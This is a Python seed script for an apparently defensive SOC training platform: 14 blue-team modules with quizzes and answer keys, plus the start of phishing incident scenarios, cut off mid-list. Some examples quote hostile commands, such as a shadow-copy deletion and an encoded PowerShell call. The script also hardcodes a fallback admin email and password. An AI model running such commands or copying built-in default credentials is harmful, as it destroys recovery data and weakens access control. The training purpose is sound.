import json
import os
from sqlalchemy.orm import Session
import models
from auth import get_password_hash

def seed_database(db: Session):
    """Safely seeds the database with initial configuration, admin, academy modules, scenarios, and default teams."""

    # 1. Seed or Update Default Administrator
    admin_email = os.getenv("ADMIN_EMAIL", "pavithra09102007@gmail.com")
    admin_password = os.getenv("ADMIN_PASSWORD", "DefendX2026")

    admin = db.query(models.Admin).filter(models.Admin.email == admin_email).first()
    if not admin:
        admin = models.Admin(
            email=admin_email,
            hashed_password=get_password_hash(admin_password)
        )
        db.add(admin)
        print(f"[SEED] Created Administrator account: {admin_email}")
    else:
        # Ensure password hash matches current config
        admin.hashed_password = get_password_hash(admin_password)
        print(f"[SEED] Updated Administrator account: {admin_email}")

    # 2. Seed Competition Settings
    settings = db.query(models.CompetitionSettings).first()
    if not settings:
        settings = models.CompetitionSettings(
            status="LOCKED",
            registration_open=True,
            default_time_limit=60
        )
        db.add(settings)
        print("[SEED] Initialized Competition Settings.")

    # 3. Seed 14 Complete Academy Modules
    modules_data = [
        {
            "module_number": 1,
            "title": "SOC Fundamentals & Triage Lifecycle",
            "category": "SOC Operations",
            "difficulty": "Beginner",
            "description": "Master the core architecture of a Security Operations Center (SOC), tier structures, alert severity mapping, and SLA handling.",
            "learning_objective": "Understand SOC tier responsibilities, triage priority matrices, and fundamental SIEM monitoring workflows.",
            "explanation": "A modern SOC operates across three tiers: Tier 1 (Triage & Validation), Tier 2 (Deep Incident Investigation), and Tier 3 (Threat Hunting & Digital Forensics). When a SIEM detects anomalous telemetry, analysts must quickly distinguish true positives from benign baseline activity without inducing alert fatigue.",
            "why_it_matters": "Improper triage causes critical incidents (e.g. ransomware beacons) to go unnoticed while SOC analysts waste time on benign false positives.",
            "example": "An alert fires for 'Multiple Failed RDP Logins followed by Success' on a domain controller. Tier 1 triage validates whether the source IP is external or an internal authorized administrative bastion host.",
            "guided_task": "Review an incoming SIEM alert for Event ID 4625 (Logon Failure) and determine the triage priority level based on the targeted service account.",
            "practice_activity": "Map a 4-step triage escalation ladder for a suspected privilege escalation event on an Active Directory Domain Controller.",
            "hints": ["Look at the account privilege level", "Check whether the source IP is internal or from a known TOR exit node"],
            "quiz_questions": [
                {
                    "question": "What is the primary role of a Tier 1 SOC Analyst?",
                    "options": [
                        "Reverse engineer malware binaries in a sandbox",
                        "Perform initial alert triage, validate true vs false positives, and escalate",
                        "Configure enterprise firewall rules and decommission domain servers",
                        "Draft quarterly cybersecurity financial budgets"
                    ],
                    "correct_index": 1,
                    "explanation": "Tier 1 analysts handle real-time alert triage, initial event classification, and escalation according to defined playbooks."
                },
                {
                    "question": "Which Windows Event ID indicates a successful account logon?",
                    "options": ["4624", "4625", "4720", "1102"],
                    "correct_index": 0,
                    "explanation": "Event ID 4624 records successful logons, whereas 4625 records logon failures."
                }
            ]
        },
        {
            "module_number": 2,
            "title": "Log Analysis & Event Correlation",
            "category": "Detection & Forensics",
            "difficulty": "Beginner",
            "description": "Analyze Linux syslog, Windows Security Event logs, Web server logs, and correlate distributed telemetry across time windows.",
            "learning_objective": "Parse raw system logs, identify anomalous event patterns, and reconstruct chronological activity across endpoints.",
            "explanation": "Logs are the immutable digital footprint of operating systems and applications. Analyzing timestamps, process execution IDs, user SIDs, and parent-child process relationships allows analysts to trace threat actor activity.",
            "why_it_matters": "Adversaries attempt to blend into normal admin workflows. Log correlation across multiple sources reveals living-off-the-land techniques.",
            "example": "Correlating a 4688 process creation event for 'powershell.exe -enc ...' with a corresponding 5156 network connection to an untrusted external IP address.",
            "guided_task": "Inspect an Nginx access log to identify SQL injection patterns in HTTP GET parameters.",
            "practice_activity": "Reconstruct a timeline of 5 events starting from a user opening a PDF to a PowerShell spawned process.",
            "hints": ["Check ParentProcessName in Sysmon Event ID 1", "Compare UTC timestamps carefully"],
            "quiz_questions": [
                {
                    "question": "Which Sysmon event ID captures process creation with full command line and parent process details?",
                    "options": ["Event ID 1", "Event ID 3", "Event ID 7", "Event ID 13"],
                    "correct_index": 0,
                    "explanation": "Sysmon Event ID 1 logs Process Creation with rich context including CommandLine, ParentImage, and Hashes."
                },
                {
                    "question": "In Apache/Nginx web server access logs, what HTTP status code indicates unauthorized access?",
                    "options": ["200 OK", "301 Redirect", "401 Unauthorized", "503 Service Unavailable"],
                    "correct_index": 2,
                    "explanation": "HTTP 401 indicates that the request lacks valid authentication credentials."
                }
            ]
        },
        {
            "module_number": 3,
            "title": "Network Investigation & Packet Analysis",
            "category": "Network Defense",
            "difficulty": "Intermediate",
            "description": "Deep-dive into PCAP analysis, Wireshark filters, DNS tunneling indicators, NetFlow anomaly detection, and Suricata/Snort signatures.",
            "learning_objective": "Extract payloads from PCAPs, identify C2 beaconing jitter, and detect DNS data exfiltration.",
            "explanation": "Network traffic does not lie. Even when adversaries use encrypted TLS, metadata such as SNI, JA3/JA4 TLS fingerprints, packet sizing, beaconing periodicity, and DNS request volumes expose malicious communication channels.",
            "why_it_matters": "When endpoints are wiped or unmonitored, network wire data provides authoritative evidence of data exfiltration and lateral movement.",
            "example": "Detecting high-frequency Base64-encoded subdomains queried to an authoritative nameserver: 'aGVsbG8.attacker-domain.com'.",
            "guided_task": "Write a Wireshark display filter to isolate all DNS queries matching suspicious top-level domains.",
            "practice_activity": "Analyze a 60-second beaconing interval with 10% random jitter from a Cobalt Strike Malleable C2 profile.",
            "hints": ["Use Wireshark filter 'dns.flags.response == 0'", "Examine the length of DNS query names"],
            "quiz_questions": [
                {
                    "question": "What Wireshark filter displays only HTTP POST requests?",
                    "options": [
                        "http.request.method == 'POST'",
                        "tcp.port == 80 && ip.src",
                        "frame.len > 1000",
                        "udp.dstport == 53"
                    ],
                    "correct_index": 0,
                    "explanation": "http.request.method == 'POST' specifically isolates all HTTP POST requests."
                },
                {
                    "question": "What is JA3 fingerprinting used for?",
                    "options": [
                        "Calculating file MD5 hashes",
                        "Fingerprinting TLS client hello parameters to identify malware C2 clients",
                        "Measuring CPU clock drift across servers",
                        "Authenticating Active Directory Kerberos tickets"
                    ],
                    "correct_index": 1,
                    "explanation": "JA3 creates a cryptographic hash of TLS Client Hello attributes to identify client applications regardless of encryption."
                }
            ]
        },
        {
            "module_number": 4,
            "title": "Endpoint Investigation & Sysinternals",
            "category": "Endpoint Security",
            "difficulty": "Intermediate",
            "description": "Investigate process injection, DLL side-loading, registry persistence keys, WMI event subscriptions, and scheduled tasks using Sysinternals tools.",
            "learning_objective": "Identify living-off-the-land binaries (LOLBINs), hidden persistence mechanisms, and process hollowing on Windows endpoints.",
            "explanation": "Attackers establish persistence via Run keys, Startup folders, services, or scheduled tasks. They inject code into legitimate processes (e.g. svchost.exe, explorer.exe) to evade endpoint detection and response (EDR) agents.",
            "why_it_matters": "Terminating a malicious process without removing its persistence mechanism results in immediate reinfection upon reboot.",
            "example": "A malicious DLL named 'version.dll' placed in the same folder as a legitimate executable, hijacking the DLL search order.",
            "guided_task": "Use Autoruns output to detect unsigned executables configured under HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
            "practice_activity": "Analyze a Process Explorer tree showing 'cmd.exe' spawned by 'WINWORD.EXE'.",
            "hints": ["Office applications should rarely spawn command shells or PowerShell", "Check the parent Process ID (PPID)"],
            "quiz_questions": [
                {
                    "question": "Which Windows Registry key is commonly abused for persistence to run binaries on user logon?",
                    "options": [
                        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "HKLM\\System\\CurrentControlSet\\Control\\TimeZoneInformation",
                        "HKCR\\.txt",
                        "HKLM\\Hardware\\Description\\System"
                    ],
                    "correct_index": 0,
                    "explanation": "The CurrentVersion\\Run keys in HKCU and HKLM execute referenced programs whenever a user logs into Windows."
                },
                {
                    "question": "What is a Living-off-the-Land Binary (LOLBIN)?",
                    "options": [
                        "A custom C++ compiler created by threat actors",
                        "A legitimate built-in system binary (like certutil, mshta, powershell) abused for malicious actions",
                        "An open-source Linux kernel module",
                        "A legacy database backup script"
                    ],
                    "correct_index": 1,
                    "explanation": "LOLBINs are native, signed OS binaries that attackers leverage to execute code, download payloads, or bypass execution policies without dropping new binaries."
                }
            ]
        },
        {
            "module_number": 5,
            "title": "IOC Investigation & Threat Hunting",
            "category": "Threat Intelligence",
            "difficulty": "Beginner",
            "description": "Verify Indicators of Compromise (IOCs) including SHA256 hashes, IP addresses, domains, and mutate IOCs into durable hunting rules.",
            "learning_objective": "Search threat intelligence databases, pivot across infrastructure, and apply the Pyramid of Pain.",
            "explanation": "David Bianco's Pyramid of Pain demonstrates that searching for Hash values is trivial for attackers to evade, while detecting TTPs (Tactics, Techniques, and Procedures) causes maximum disruption to adversary operations.",
            "why_it_matters": "Relying strictly on static hash IOCs leads to a false sense of security because polymorphic malware changes hashes on every compilation.",
            "example": "Pivoting from a malicious domain 'cdn-update-services.net' to its registration email and uncovering 12 additional C2 domains registered by the same threat actor.",
            "guided_task": "Evaluate a file hash against VirusTotal sandbox results and identify the associated threat actor group.",
            "practice_activity": "Classify 5 security indicators according to their position on the Pyramid of Pain.",
            "hints": ["TTPs are at the top of the Pyramid of Pain", "Hashes are at the bottom"],
            "quiz_questions": [
                {
                    "question": "According to the Pyramid of Pain, which indicator type is hardest for an adversary to change?",
                    "options": [
                        "IP Addresses",
                        "Hash Values",
                        "Domain Names",
                        "TTPs (Tactics, Techniques & Procedures)"
                    ],
                    "correct_index": 3,
                    "explanation": "TTPs represent the adversary's behavioral patterns and operational habits, which require substantial retraining and re-tooling to alter."
                },
                {
                    "question": "What type of cryptographic hash has a length of 64 hexadecimal characters (256 bits)?",
                    "options": ["MD5", "SHA-1", "SHA-256", "CRC32"],
                    "correct_index": 2,
                    "explanation": "SHA-256 generates a 256-bit hash, represented as a 64-character hexadecimal string."
                }
            ]
        },
        {
            "module_number": 6,
            "title": "Phishing Analysis & Header Deconstruction",
            "category": "Email Security",
            "difficulty": "Intermediate",
            "description": "Deconstruct email headers (SPF, DKIM, DMARC), analyze malicious attachments, extract hidden URLs, and detect spear-phishing.",
            "learning_objective": "Extract authentication verification fields from MIME headers and uncover credential harvesting landing pages.",
            "explanation": "Phishing remains the #1 initial access vector. Threat actors forge sender addresses, exploit lookalike typo-squatted domains, and use obfuscated QR codes (quishing) or HTML smuggling to bypass secure email gateways (SEGs).",
            "why_it_matters": "Promptly identifying a phishing campaign enables SOC teams to purge all matching emails across the entire company mailbox store before other employees click.",
            "example": "Analyzing 'Received: from mail.spoofed-bank.com (198.51.100.12)' where DMARC policy evaluation yields 'p=none; dkim=fail; spf=softfail'.",
            "guided_task": "Trace the origin IP from the bottom-most untrusted 'Received:' header of an email sample.",
            "practice_activity": "Decode an HTML attachment utilizing Base64-encoded JavaScript payload delivery.",
            "hints": ["Read 'Received:' headers from bottom to top", "Check the 'Authentication-Results' header"],
            "quiz_questions": [
                {
                    "question": "Which email authentication protocol provides cryptographic validation that the email content was not altered in transit?",
                    "options": ["SPF", "DKIM", "DMARC", "POP3"],
                    "correct_index": 1,
                    "explanation": "DKIM (DomainKeys Identified Mail) uses public-key cryptography to digitally sign emails, verifying message integrity."
                },
                {
                    "question": "What is 'HTML Smuggling' in phishing campaigns?",
                    "options": [
                        "Sending emails in plain text only",
                        "Constructing malicious payloads client-side inside the browser using HTML5 and JavaScript to bypass perimeter scanners",
                        "Flooding the SMTP server with large image files",
                        "Deleting DNS MX records"
                    ],
                    "correct_index": 1,
                    "explanation": "HTML Smuggling uses HTML5 attributes and JavaScript blobs to assemble malicious files directly in the victim's browser, evading static gateway inspection."
                }
            ]
        },
        {
            "module_number": 7,
            "title": "Threat Intelligence & Adversary Profiling",
            "category": "Threat Intelligence",
            "difficulty": "Intermediate",
            "description": "Utilize threat intelligence frameworks, Diamond Model analysis, Cyber Kill Chain, and OSINT attribution to profile threat actors.",
            "learning_objective": "Correlate tactical indicators to strategic adversary motivations and targeted industry campaigns.",
            "explanation": "Cyber Threat Intelligence (CTI) transforms raw data into actionable knowledge. The Diamond Model links four core components of an intrusion: Adversary, Infrastructure, Capability, and Victim.",
            "why_it_matters": "Understanding the adversary's ultimate objective (e.g. espionage vs financial extortion) dictates incident response containment priorities.",
            "example": "Attributing an intrusion to APT29 based on customized Cobalt Strike watermarking, specific PowerShell payloads, and targeting of foreign affairs ministries.",
            "guided_task": "Construct a Diamond Model diagram linking an observed C2 IP, PowerShell dropper, targeted aerospace engineer, and suspected threat actor group.",
            "practice_activity": "Map the 7 phases of Lockheed Martin's Cyber Kill Chain to an active multi-stage intrusion.",
            "hints": ["Diamond Model corners: Adversary, Capability, Infrastructure, Victim", "Kill Chain begins with Reconnaissance"],
            "quiz_questions": [
                {
                    "question": "What are the four vertices of the Diamond Model of Intrusion Analysis?",
                    "options": [
                        "Detect, Investigate, Respond, Report",
                        "Adversary, Capability, Infrastructure, Victim",
                        "Confidentiality, Integrity, Availability, Non-repudiation",
                        "Firewall, SIEM, EDR, SOAR"
                    ],
                    "correct_index": 1,
                    "explanation": "The Diamond Model represents every malicious event as a relationship between an Adversary, their Capability, the Infrastructure used, and the Victim."
                },
                {
                    "question": "Which phase of the Cyber Kill Chain immediately precedes 'Actions on Objectives'?",
                    "options": ["Weaponization", "Reconnaissance", "Installation", "Command and Control (C2)"],
                    "correct_index": 3,
                    "explanation": "After establishing Command & Control, the adversary executes Actions on Objectives (e.g., data theft or encryption)."
                }
            ]
        },
        {
            "module_number": 8,
            "title": "Incident Response Lifecycle & NIST SP 800-61",
            "category": "Incident Response",
            "difficulty": "Intermediate",
            "description": "Master the 4 phases of NIST SP 800-61: Preparation, Detection & Analysis, Containment/Eradication/Recovery, and Post-Incident Activity.",
            "learning_objective": "Formulate containment strategies, execute eradication workflows, and conduct effective Post-Mortem reviews.",
            "explanation": "Incident response is a structured discipline. Containment must isolate compromised systems without destroying forensic memory artifacts needed for root-cause analysis.",
            "why_it_matters": "Prematurely restarting infected servers or changing passwords on an uncontained network alerts the adversary, causing them to deploy wiper malware.",
            "example": "Isolating an infected database server from the network via EDR network containment while keeping the hypervisor VM running to allow RAM acquisition.",
            "guided_task": "Create an Incident Response Playbook decision tree for responding to a compromised domain administrator account.",
            "practice_activity": "Sequence containment actions to prevent lateral movement during an active ransomware staging phase.",
            "hints": ["Never reboot before memory capture", "Isolate network segment first"],
            "quiz_questions": [
                {
                    "question": "What is the primary danger of rebooting a compromised server during an active investigation?",
                    "options": [
                        "It permanently increases server CPU usage",
                        "Volatile data in RAM (such as decrypted payloads, injected code, and active network connections) is permanently lost",
                        "The IP address will automatically change",
                        "The BIOS battery will be discharged"
                    ],
                    "correct_index": 1,
                    "explanation": "Rebooting clears volatile RAM, wiping out running malicious processes, memory-only implants, and live network connection tables."
                },
                {
                    "question": "What is the final phase in the NIST SP 800-61 Incident Handling lifecycle?",
                    "options": [
                        "Containment, Eradication & Recovery",
                        "Detection & Analysis",
                        "Post-Incident Activity (Lessons Learned)",
                        "Preparation"
                    ],
                    "correct_index": 2,
                    "explanation": "Post-Incident Activity evaluates what happened, how well the team responded, and updates playbooks to prevent recurrence."
                }
            ]
        },
        {
            "module_number": 9,
            "title": "Evidence Handling & Forensic Integrity",
            "category": "Digital Forensics",
            "difficulty": "Intermediate",
            "description": "Maintain the Chain of Custody, perform volatile memory acquisition, disk imaging (E01/Raw), and compute cryptographic validation hashes.",
            "learning_objective": "Preserve evidentiary integrity, adhere to Order of Volatility, and document forensic exhibits for legal admissibility.",
            "explanation": "Digital evidence must remain legally pristine. The RFC 3227 Order of Volatility dictates collecting the most transient data first (Registers/Cache -> Routing Tables/RAM -> Disk -> Archival backups).",
            "why_it_matters": "Failure to maintain chain of custody or verify pre- and post-acquisition hashes can cause critical evidence to be excluded in legal proceedings.",
            "example": "Acquiring memory via WinPmem, generating a SHA-256 checksum immediately, and logging the transfer of custody to the forensic locker.",
            "guided_task": "Calculate the SHA-256 hash of a disk image and verify that the forensic clone matches the master source perfectly.",
            "practice_activity": "Order 5 digital artifacts from highest volatility to lowest volatility according to RFC 3227.",
            "hints": ["CPU registers and RAM are most volatile", "Optical media and backups are least volatile"],
            "quiz_questions": [
                {
                    "question": "According to RFC 3227 Order of Volatility, which data source should be collected FIRST?",
                    "options": [
                        "Hard disk drives",
                        "System memory (RAM) and cache",
                        "Archival backup tapes",
                        "Printed system documentation"
                    ],
                    "correct_index": 1,
                    "explanation": "RAM and processor cache are highly volatile and vanish immediately upon power loss, so they must be acquired first."
                },
                {
                    "question": "What is the purpose of a Chain of Custody document?",
                    "options": [
                        "To calculate employee bonuses",
                        "To record the chronological sequence of custody, control, transfer, analysis, and disposition of physical or electronic evidence",
                        "To approve network firewall changes",
                        "To register domain names"
                    ],
                    "correct_index": 1,
                    "explanation": "Chain of custody documentation proves that evidence was handled securely and was not tampered with or modified."
                }
            ]
        },
        {
            "module_number": 10,
            "title": "Alert Triage & False Positive Reduction",
            "category": "SOC Operations",
            "difficulty": "Beginner",
            "description": "Distinguish malicious indicators from benign administrative activity, optimize detection rules, and reduce alert fatigue.",
            "learning_objective": "Evaluate alert contextual fidelity, tune noisy signatures, and identify authorized sysadmin tool usage.",
            "explanation": "SOC analysts are inundated with thousands of alerts daily. Understanding how legitimate administrative tools (like PsExec, SCCM, and backup agents) operate prevents costly false alarms.",
            "why_it_matters": "Alert fatigue leads directly to analyst burnout and missed genuine intrusions.",
            "example": "Identifying that an alert for 'certutil.exe file download' was triggered by an authorized IT script updating root certificates from Microsoft servers.",
            "guided_task": "Review 4 firewall alerts and classify each as either True Positive, True Negative, False Positive, or False Negative.",
            "practice_activity": "Tune a Sigma rule for Mimikatz detection to whitelist authorized vulnerability scanning accounts.",
            "hints": ["Check the user context and scheduled task name", "Verify if the destination IP belongs to Microsoft Update"],
            "quiz_questions": [
                {
                    "question": "What is a 'False Positive' in cybersecurity monitoring?",
                    "options": [
                        "A benign or legitimate event incorrectly flagged as malicious by a security tool",
                        "An actual malicious attack that was completely missed by all sensors",
                        "A malware sample that only infects Linux systems",
                        "A hardware failure in a network switch"
                    ],
                    "correct_index": 0,
                    "explanation": "A False Positive occurs when normal, legitimate system activity triggers a security alert."
                },
                {
                    "question": "Which tool or format has become the universal standard for sharing vendor-agnostic SIEM detection rules?",
                    "options": ["Sigma", "CSV", "PDF", "HTML5"],
                    "correct_index": 0,
                    "explanation": "Sigma is the open standard format for describing detection logic in SIEM and log analysis systems."
                }
            ]
        },
        {
            "module_number": 11,
            "title": "MITRE ATT&CK Framework Mapping",
            "category": "Threat Intelligence",
            "difficulty": "Intermediate",
            "description": "Navigate the MITRE ATT&CK Matrix, map adversary behaviors to Technique IDs, and identify defensive coverage gaps.",
            "learning_objective": "Deconstruct raw forensic evidence into specific Tactics (TAXXXX) and Techniques (TXXXX.XXX).",
            "explanation": "MITRE ATT&CK provides a common taxonomy for describing cyber adversary behavior. It organizes techniques across 14 tactics spanning Initial Access to Impact.",
            "why_it_matters": "Mapping alerts to ATT&CK enables security teams to visualize defense coverage and anticipate an adversary's next likely move.",
            "example": "Mapping 'vssadmin.exe delete shadows /all /quiet' to ATT&CK Technique T1490 (Inhibit System Recovery).",
            "guided_task": "Map three attacker actions (Phishing attachment, PowerShell execution, and LSASS dumping) to their corresponding ATT&CK IDs.",
            "practice_activity": "Construct an ATT&CK Navigator heat map representing an APT group's known campaign capabilities.",
            "hints": ["T1059 is Command and Scripting Interpreter", "T1003 is OS Credential Dumping"],
            "quiz_questions": [
                {
                    "question": "What is the difference between an ATT&CK Tactic and an ATT&CK Technique?",
                    "options": [
                        "Tactics represent the adversary's tactical goal (the 'Why'), while Techniques represent how they achieve that goal (the 'How')",
                        "Tactics are for defense, Techniques are for offense only",
                        "Tactics apply to cloud only, Techniques apply to on-premise",
                        "There is no difference"
                    ],
                    "correct_index": 0,
                    "explanation": "Tactics describe the adversary's objective (e.g. Credential Access), while Techniques detail the exact mechanism used (e.g. LSASS Memory Dumping)."
                },
                {
                    "question": "Which MITRE ATT&CK Technique ID corresponds to OS Credential Dumping: LSASS Memory?",
                    "options": ["T1003.001", "T1059.001", "T1078", "T1486"],
                    "correct_index": 0,
                    "explanation": "T1003.001 specifically catalogs dumping memory from the Local Security Authority Subsystem Service (LSASS)."
                }
            ]
        },
        {
            "module_number": 12,
            "title": "Forensic Reasoning & Hypothesis Testing",
            "category": "Digital Forensics",
            "difficulty": "Advanced",
            "description": "Apply the scientific method to digital forensics: formulate hypotheses, test against telemetry, and eliminate confirmation bias.",
            "learning_objective": "Structure complex multi-host forensic investigations through rigorous evidence-based hypothesis testing.",
            "explanation": "Forensic reasoning requires systematically building rival hypotheses (e.g. 'Account compromise via stolen session cookie' vs 'Credential stuffing'). Investigators must seek falsifying evidence rather than merely confirming initial assumptions.",
            "why_it_matters": "Confirmation bias leads analysts down dead-end rabbit holes while the actual intrusion vector remains unpatched.",
            "example": "Formulating the hypothesis that a webshell was uploaded via CVE-2023-XXXX, then checking web server POST logs for anomalous file extensions.",
            "guided_task": "Draft two competing hypotheses for how a domain controller was accessed and identify the specific logs needed to falsify each.",
            "practice_activity": "Evaluate circumstantial evidence vs authoritative evidence in a cloud data exfiltration incident.",
            "hints": ["Look for direct authentication events with source IP", "Falsify the hypothesis with timestamp anomalies"],
            "quiz_questions": [
                {
                    "question": "What is 'Confirmation Bias' in incident investigation?",
                    "options": [
                        "The tendency to search for, interpret, and recall information in a way that confirms one's preexisting beliefs or early theories",
                        "Verifying cryptographic signatures on binary files",
                        "Receiving confirmation from a user that an alert was benign",
                        "A database transaction confirmation"
                    ],
                    "correct_index": 0,
                    "explanation": "Confirmation bias causes investigators to overweight evidence supporting their initial theory while ignoring contradictory data."
                },
                {
                    "question": "What is the primary requirement for evidence to be considered 'Authoritative'?",
                    "options": [
                        "It must be directly verified from immutable, tamper-evident system records and unequivocally establish a factual action",
                        "It must be mentioned on social media",
                        "It must be signed by an executive",
                        "It must be more than 1 megabyte in size"
                    ],
                    "correct_index": 0,
                    "explanation": "Authoritative evidence provides definitive, verifiable proof of an event from trustworthy, untampered logging mechanisms."
                }
            ]
        },
        {
            "module_number": 13,
            "title": "Incident Documentation & Executive Reporting",
            "category": "Communication & Reporting",
            "difficulty": "Intermediate",
            "description": "Craft professional 11-section incident response reports, synthesize executive summaries, and write actionable remediation roadmaps.",
            "learning_objective": "Translate deeply technical forensic findings into clear business risk impacts and prioritized remediation steps.",
            "explanation": "An incident is not closed until it is documented. Reports serve technical teams (remediation steps, IOC lists, firewall rules) and executive leadership (root cause, business impact, legal liabilities, board summaries).",
            "why_it_matters": "Poor documentation causes recurring breaches, fails regulatory compliance (GDPR/HIPAA/SEC), and undermines stakeholder trust.",
            "example": "Drafting an executive summary highlighting that although 500 records were accessed, full containment was achieved within 34 minutes with zero ransomware execution.",
            "guided_task": "Structure an 11-section incident report from a raw bulleted list of investigation findings.",
            "practice_activity": "Write an Executive Summary highlighting Root Cause, Impact, Containment status, and Long-Term Recommendations.",
            "hints": ["Keep the Executive Summary non-technical and focused on business impact", "Include exact IOC hashes in the appendix"],
            "quiz_questions": [
                {
                    "question": "What is the primary focus of an Executive Summary in an Incident Report?",
                    "options": [
                        "Displaying raw hex dumps of network packets",
                        "Providing a concise high-level overview of the incident scope, business impact, root cause, and remediation status for leadership",
                        "Listing the names and phone numbers of all IT employees",
                        "Detailing assembly code instructions"
                    ],
                    "correct_index": 1,
                    "explanation": "Executive summaries give C-level stakeholders a clear understanding of the business risk, impact, timeline, and current operational posture."
                },
                {
                    "question": "Which of the following is an example of a Long-Term Strategic Recommendation?",
                    "options": [
                        "Isolate the single infected host right now",
                        "Implement mandatory Phishing-Resistant Multi-Factor Authentication (FIDO2) across all corporate identities and decommission legacy protocols",
                        "Reset user Jane's password immediately",
                        "Reboot the workstation"
                    ],
                    "correct_index": 1,
                    "explanation": "Strategic recommendations address systemic architectural weaknesses to prevent entire classes of future intrusions."
                }
            ]
        },
        {
            "module_number": 14,
            "title": "Blue Team Critical Decisions & Trade-Offs",
            "category": "Incident Response Strategy",
            "difficulty": "Advanced",
            "description": "Analyze high-stakes Blue Team decisions: immediate isolation vs adversary monitoring, legal considerations, and operational continuity.",
            "learning_objective": "Make balanced crisis response decisions under time pressure, weighing business availability against containment rigor.",
            "explanation": "In real-world cyber warfare, Blue Teams constantly navigate trade-offs. Should an analyst instantly sever an attacker's C2 connection (risking that they trigger a backup persistence channel), or monitor the session to identify the full scope of compromise?",
            "why_it_matters": "A hasty, uncoordinated response alerts the threat actor, while excessive delay risks catastrophic intellectual property theft or domain-wide encryption.",
            "example": "Balancing the decision to pull a mission-critical hospital patient records database offline versus applying strict host-based micro-segmentation rules.",
            "guided_task": "Evaluate a scenario where an active attacker is in the network and choose between instant host shutdown, network isolation, or honeytoken deployment.",
            "practice_activity": "Formulate a coordinated containment execution plan ensuring all adversary footholds are neutralized simultaneously.",
            "hints": ["Coordinated containment prevents the attacker from adapting", "Always preserve evidence before destructive containment"],
            "quiz_questions": [
                {
                    "question": "Why is 'Coordinated Simultaneous Containment' preferred over piecemeal host-by-host containment during an advanced intrusion?",
                    "options": [
                        "It saves electricity in the data center",
                        "If you terminate only one attacker foothold at a time, the adversary will notice and immediately pivot, deploy wipers, or utilize backup access",
                        "It is required by IEEE standards",
                        "It reduces the size of log files"
                    ],
                    "correct_index": 1,
                    "explanation": "Piecemeal containment tips off the adversary. Coordinated containment severs all identified C2 nodes, revoked credentials, and persistence mechanisms at once."
                },
                {
                    "question": "When is it appropriate to isolate a system via EDR network isolation rather than pulling the physical Ethernet cable?",
                    "options": [
                        "When you need to maintain remote forensic telemetry and triage capability while cutting off all unauthorized lateral/inbound/outbound traffic",
                        "When the server has no network card",
                        "Only on weekends",
                        "When you want the malware to spread faster"
                    ],
                    "correct_index": 0,
                    "explanation": "EDR network isolation allows the security team to maintain a secure management tunnel to the host for live forensic acquisition while blocking all other network traffic."
                }
            ]
        }
    ]

    for m in modules_data:
        for question in m["quiz_questions"]:
            question.setdefault("difficulty", m["difficulty"])
            question.setdefault("topic", m["category"])
        supplemental_questions = [
            {
                "question": f"Which analyst habit best supports {m['title']} work?",
                "options": ["Record evidence and validate it against trusted telemetry", "Ignore timestamps", "Delete raw logs after review", "Treat every alert as confirmed"],
                "correct_index": 0,
                "explanation": "Evidence-backed validation and accurate records are core Blue Team practices.",
                "difficulty": m["difficulty"],
                "topic": m["category"]
            },
            {
                "question": f"What should a Blue Team analyst preserve while investigating {m['category']} activity?",
                "options": ["Relevant logs, timestamps, and source context", "Only the final alert title", "Unverified social media posts", "A screenshot with no timestamp"],
                "correct_index": 0,
                "explanation": "Complete, timestamped telemetry enables correlation, review, and defensible response decisions.",
                "difficulty": m["difficulty"],
                "topic": m["category"]
            },
            {
                "question": f"Which response improves future detection of {m['title']} incidents?",
                "options": ["Turn off the related telemetry", "Document indicators and update a tested detection rule", "Reuse an unvalidated IOC forever", "Close the case without lessons learned"],
                "correct_index": 1,
                "explanation": "Documented indicators and tested detections turn an investigation into durable defensive coverage.",
                "difficulty": m["difficulty"],
                "topic": m["category"]
            }
        ]
        m["quiz_questions"].extend(supplemental_questions[:max(0, 5 - len(m["quiz_questions"]))])

    for m in modules_data:
        existing = db.query(models.AcademyModule).filter(models.AcademyModule.module_number == m["module_number"]).first()
        if not existing:
            mod = models.AcademyModule(
                module_number=m["module_number"],
                title=m["title"],
                category=m["category"],
                difficulty=m["difficulty"],
                description=m["description"],
                learning_objective=m["learning_objective"],
                explanation=m["explanation"],
                why_it_matters=m["why_it_matters"],
                example=m["example"],
                guided_task=m["guided_task"],
                practice_activity=m["practice_activity"],
                hints_json=json.dumps(m["hints"]),
                quiz_questions_json=json.dumps(m["quiz_questions"])
            )
            db.add(mod)
            print(f"[SEED] Created Academy Module #{m['module_number']}: {m['title']}")
        else:
            existing.title = m["title"]
            existing.category = m["category"]
            existing.difficulty = m["difficulty"]
            existing.description = m["description"]
            existing.learning_objective = m["learning_objective"]
            existing.explanation = m["explanation"]
            existing.why_it_matters = m["why_it_matters"]
            existing.example = m["example"]
            existing.guided_task = m["guided_task"]
            existing.practice_activity = m["practice_activity"]
            existing.hints_json = json.dumps(m["hints"])
            existing.quiz_questions_json = json.dumps(m["quiz_questions"])

    db.commit()

    # 4. Seed 3 Detailed Cyber Incident Scenarios
    scenarios_data = [
        {
            "key": "fincore-phishing",
            "name": "FINCORE PHISHING & LATERAL MOVEMENT",
            "difficulty": "Medium",
            "attack_type": "Credential Harvesting & Lateral Movement",
            "attack_vector": "Phishing Email with Macro-Enabled Invoice",
            "affected_asset": "WS-FIN-04 (10.0.2.45)",
            "primary_ioc": "c2-update.darknet-relay.com",
            "description": "A targeted spear-phishing attack against FinCore Global Financial Services. A financial controller received a fraudulent wire update invoice that executed obfuscated PowerShell, harvested domain credentials from LSASS, and attempted lateral movement toward the core SQL database.",
            "detection_signal": "SIEM Alert #9042: High-Severity Outbound C2 Beaconing to untrusted IP 185.220.101.44 and anomalous LSASS memory access on WS-FIN-04.",
            "detection_options": [
                {
                    "id": "det-1",
                    "title": "Alert #9042: Anomalous LSASS Memory Read & C2 Beaconing on WS-FIN-04 (10.0.2.45)",
                    "severity": "CRITICAL",
                    "source": "SIEM / EDR Core",
                    "description": "Process WINWORD.EXE spawned PowerShell with encoded command initiating outbound TLS to 185.220.101.44 followed by OpenProcess call on lsass.exe.",
                    "is_correct": True
                },
                {
                    "id": "det-2",
                    "title": "Alert #8819: Routine Backup Agent CPU Usage Spike on PRD-SRV-01",
                    "severity": "LOW",
                    "source": "Infrastructure Monitor",
                    "description": "Veeam Backup agent CPU usage exceeded 85% during scheduled nightly maintenance snapshot.",
                    "is_correct": False
                },
                {
                    "id": "det-3",
                    "title": "Alert #9011: Printer Spooler Restart on 3rd Floor Office",
                    "severity": "INFO",
                    "source": "Print Server",
